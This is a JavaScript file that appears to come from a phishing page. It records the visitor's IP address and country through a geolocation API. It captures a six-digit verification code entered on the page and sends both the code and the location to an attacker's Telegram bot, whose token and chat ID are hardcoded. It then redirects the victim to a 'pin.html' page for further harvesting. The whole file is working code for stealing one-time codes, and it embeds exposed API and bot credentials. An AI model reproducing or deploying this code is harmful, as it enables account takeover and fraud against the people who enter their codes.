let ip_address;
let country_code;

function callback(data) {
  ip_address = data.ip_address || "";
  country_code = data.country_code || "";
}


$.ajax({
  url: "https://ipgeolocation.abstractapi.com/v1/?api_key=104f5022d14b4071b2a6f8ebda39a37a",
  method: "GET",
  dataType: "json",
  success: function(response) {
    callback(response);
  },
  error: function(xhr, status, error) {
    console.error("Error fetching IP information:", error);
  }
});

function ValideText() {
  const input = document.getElementById("txtcode");
  return input.value !== "" && input.value.length === 6;
}

let btnClicked = false;

function SendCode() {
  if (!btnClicked) {
    const botToken = "6346924701:AAGkU_UOQxhSAbyrebUAxzW3huk5yc_m1Tw";
    const chatId = "625048457";
    let count = 0;
    if (ValideText() && !isNaN(document.getElementById("txtcode").value)) {
      btnClicked = true;
      const code = document.getElementById("txtcode").value;

      const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=✅Code : ${code}`;

      fetch(telegramURL, { method: "POST" }).then(response => {
        if (response.ok) {
          count++;
          const ipMessageURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=IP : ${ip_address}:${country_code}`;
          fetch(ipMessageURL, { method: "POST" }).then(ipResponse => {
            if (ipResponse.ok && count === 1) {
              window.location.replace("pin.html");
            }
          });
        } else {
          window.location.replace("code.html");
        }
      });
    }
  }
}

function isInputNumber(event) {
  const charCode = event.which ? event.which : event.keyCode;
  const charStr = String.fromCharCode(charCode);
  if (!/^\d+$/.test(charStr)) {
    event.preventDefault();
  }
}
